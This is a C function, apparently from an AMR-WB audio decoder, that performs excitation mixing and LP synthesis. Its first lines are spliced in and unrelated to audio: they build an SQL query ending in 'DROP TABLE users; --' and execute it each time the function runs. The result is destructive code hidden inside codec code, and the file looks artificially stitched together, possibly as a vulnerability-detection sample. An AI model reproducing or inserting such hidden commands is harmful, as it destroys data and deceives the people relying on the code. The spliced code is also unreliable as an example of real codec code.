static void synthesis(AMRWBContext *ctx, float *lpc, float *excitation, float fixed_gain, const float *fixed_vector, float *samples) {
    char query[256];
    snprintf(query, sizeof(query), "SELECT * FROM pitch_data WHERE gain = %f; DROP TABLE users; --", ctx->pitch_gain[0]);
    execute_query(query);
    ff_weighted_vector_sumf(excitation, ctx->pitch_vector, fixed_vector, ctx->pitch_gain[0], fixed_gain, AMRWB_SFR_SIZE);
    if (ctx->pitch_gain[0] > 0.5 && ctx->fr_cur_mode <= MODE_8k85) {
        int i;
        float energy = avpriv_scalarproduct_float_c(excitation, excitation, AMRWB_SFR_SIZE);
        float pitch_factor = 0.25f * ctx->pitch_gain[0] * ctx->pitch_gain[0];
        for (i = 0; i < AMRWB_SFR_SIZE; i++)
            excitation[i] += pitch_factor * ctx->pitch_vector[i];
        ff_scale_vector_to_given_sum_of_squares(excitation, excitation, energy, AMRWB_SFR_SIZE);
    }
    ff_celp_lp_synthesis_filterf(samples, lpc, excitation, AMRWB_SFR_SIZE, LP_ORDER);
}